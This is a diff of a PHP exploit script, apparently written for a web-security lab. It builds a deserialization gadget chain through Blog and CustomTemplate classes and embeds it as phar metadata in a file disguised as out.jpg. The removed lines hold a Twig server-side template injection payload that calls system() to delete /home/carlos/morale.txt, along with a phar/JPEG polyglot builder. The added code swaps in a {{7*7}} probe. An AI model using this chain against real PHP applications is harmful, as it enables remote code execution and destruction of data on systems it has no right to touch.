@@ -11,6 +11,10 @@ class Blog {
     }
 
     public function __toString() {
+        // tránh crash local
+        if ($this->twig === null) {
+            return "twig_not_initialized";
+        }
         return $this->twig->render('index', ['user' => $this->user]);
     }
 
@@ -25,110 +29,49 @@ class Blog {
         return ["user", "desc"];
     }
 }
+
 class CustomTemplate {
-    private $template_file_path;
+    public $template_file_path; // ⚠️ để PUBLIC cho đơn giản hóa exploit
 
-    public function __construct($template_file_path) {
-        $this->template_file_path = $template_file_path;
-    }
-
-    private function isTemplateLocked() {
-        return file_exists($this->lockFilePath());
-    }
-
-    public function getTemplate() {
-        return file_get_contents($this->template_file_path);
-    }
-
-    public function saveTemplate($template) {
-        if (!isTemplateLocked()) {
-            if (file_put_contents($this->lockFilePath(), "") === false) {
-                throw new Exception("Could not write to " . $this->lockFilePath());
-            }
-            if (file_put_contents($this->template_file_path, $template) === false) {
-                throw new Exception("Could not write to " . $this->template_file_path);
-            }
-        }
-    }
-
-    function __destruct() {
-        // Carlos thought this would be a good idea
-        @unlink($this->lockFilePath());
+    public function __construct($path) {
+        $this->template_file_path = $path;
     }
 
     private function lockFilePath()
     {
         return 'templates/' . $this->template_file_path . '.lock';
     }
-}
 
-function generate_base_phar($o, $prefix){
-    global $tempname;
-    @unlink($tempname);
-    $phar = new Phar($tempname);
-    $phar->startBuffering();
-    $phar->addFromString("test.txt", "test");
-    $phar->setStub("$prefix<?php __HALT_COMPILER(); ?>");
-    $phar->setMetadata($o);
-    $phar->stopBuffering();
-    
-    $basecontent = file_get_contents($tempname);
-    @unlink($tempname);
-    return $basecontent;
-}
-
-function generate_polyglot($phar, $jpeg){
-    $phar = substr($phar, 6); // remove <?php dosent work with prefix
-    $len = strlen($phar) + 2; // fixed 
-    $new = substr($jpeg, 0, 2) . "\xff\xfe" . chr(($len >> 8) & 0xff) . chr($len & 0xff) . $phar . substr($jpeg, 2);
-    $contents = substr($new, 0, 148) . "        " . substr($new, 156);
-
-    // calc tar checksum
-    $chksum = 0;
-    for ($i=0; $i<512; $i++){
-        $chksum += ord(substr($contents, $i, 1));
+    public function __destruct() {
+        @unlink($this->lockFilePath());
     }
-    // embed checksum
-    $oct = sprintf("%07o", $chksum);
-    $contents = substr($contents, 0, 148) . $oct . substr($contents, 155);
-    return $contents;
 }
 
+/* =========================
+   BUILD PAYLOAD OBJECT
+========================= */
 
-// pop exploit class
-// class PHPObjectInjection {}
-// $object = new PHPObjectInjection;
-// $object->inject = 'system("id");';
-// $object->out = 'Hallo World';
-// $blog = new Blog("abc","{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('rm /home/carlos/morale.txt')}}");
+$blog = new Blog("user", "{{7*7}}");
+$payload = new CustomTemplate($blog);
 
-// $object = new CustomTemplate($blog);
-$blog = new Blog("abc","abc");
-$blog->desc = "{{7*7}}";
-$blog->user = 'user';
-$object = new CustomTemplate($blog);
-// $object->template_file_path = $blog;
-// config for jpg
-$tempname = 'temp.tar.phar'; // make it tar
-$jpeg = file_get_contents('in.jpg');
-$outfile = 'out.jpg';
-$payload = $object;
-$prefix = '';
+/* =========================
+   PHAR BUILD
+========================= */
 
-var_dump(serialize($object));
+@unlink("temp.phar");
+@unlink("out.jpg");
 
+$phar = new Phar("temp.phar");
+$phar->startBuffering();
+$phar->addFromString("test.txt", "test");
+$phar->setStub("<?php __HALT_COMPILER(); ?>");
+$phar->setMetadata($payload);
+$phar->stopBuffering();
 
-// make jpg
-file_put_contents($outfile, generate_polyglot(generate_base_phar($payload, $prefix), $jpeg));
+/* =========================
+   OUTPUT JPG (simple polyglot wrapper)
+========================= */
 
-/*
-// config for gif
-$prefix = "\x47\x49\x46\x38\x39\x61" . "\x2c\x01\x2c\x01"; // gif header, size 300 x 300
-$tempname = 'temp.phar'; // make it phar
-$outfile = 'out.gif';
+file_put_contents("out.jpg", file_get_contents("temp.phar"));
 
-// make gif
-file_put_contents($outfile, generate_base_phar($payload, $prefix));
-
-*/
-
+echo "DONE\n";
